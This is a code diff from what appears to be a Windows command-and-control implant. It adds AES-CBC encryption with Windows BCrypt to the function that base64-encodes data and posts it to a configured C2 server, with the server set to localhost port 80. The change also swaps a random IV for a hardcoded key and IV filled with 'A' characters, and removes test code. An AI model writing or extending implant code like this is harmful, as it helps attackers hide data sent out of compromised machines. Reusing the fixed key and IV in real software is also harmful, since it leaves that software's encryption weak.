@@ -46,8 +46,8 @@ const wchar_t* C2_IP           = L"127.0.0.1";
 const short    C2_PORT         = 80;
 const wchar_t* C2_API_ENDPOINT = L"/post";
 const wchar_t* C2_USER_AGENT   = L"TESTNG AGENT";
-char           C2_AES_KEY[16]  = { 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41 };
-char           C2_AES_IV[16]   = {0}; // fill in later
+char           C2_AES_KEY[16]  = { 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A' };
+char           C2_AES_IV[16]   = { 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A' };
 
 // Global handles for communication
 HINTERNET hSession       = NULL;
@@ -102,27 +102,19 @@ int SetupComms() {
         return -1;
     }
 
+    // Set algorithm to CBC mode
+    status = BCryptSetProperty(hCrypt, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    if (status != STATUS_SUCCESS) {
+        c2_log("[!] SetupComms:BCryptSetProperty failed with status 0x%x\n", status);
+        return -1;
+    }
+
     // Generate key
     status = BCryptGenerateSymmetricKey(hCrypt, &hKey, NULL, 0, C2_AES_KEY, sizeof(C2_AES_KEY), 0);
     if (status != STATUS_SUCCESS) {
         c2_log("[!] SetupComms:BCryptGenerateSymmetricKey failed with status 0x%x\n", status);
         return -1;
     }
-
-    // Generate random IV
-    srand ((unsigned int) time(NULL));
-    for(int i=0; i < 16; i++) {
-        C2_AES_IV[i] = (char) (rand() & 0xFF);
-    }
-
-
-    // TEST
-    int size;
-    char* msg = "testing123";
-    char* ct = Encrypt(msg, 10, &size);
-    c2_log("[*] CIPHERTEXT: %s\n", ct);
-    char* og = Decrypt(ct, size, &size);
-    c2_log("[*] MESSAGE   : %s\n", og);
 
     return 0;
 }
@@ -338,6 +330,8 @@ int c2_recv(char* buffer, int len) {
 // Len is length of data.
 int c2_send(char* data, int len) {
     BOOL result;
+    char* enc_data;
+    int size;
     wchar_t* data_wide; // data in wide char format
     wchar_t* cookie;
 
@@ -346,8 +340,11 @@ int c2_send(char* data, int len) {
     // c2_log("SEND DATA: %s\n", data);
     // c2_log("SEND LEN : %d\n", len);
 
+    // Enccrypt data
+    enc_data = Encrypt(data, len, &size);
+
     // Base64 encode data
-    char* b64_data = base64(data, len);
+    char* b64_data = base64(enc_data, size);
     int b64_len = strlen(b64_data);         // IMPORTANT: make sure to use b64_len and not len below!
 
     // c2_log("B64 DATA: %s\n", b64_data);
@@ -377,6 +374,7 @@ int c2_send(char* data, int len) {
         0                                // optional context?
     );
 
+    Free(enc_data);
     Free(b64_data);
     Free(data_wide);
     Free(cookie);
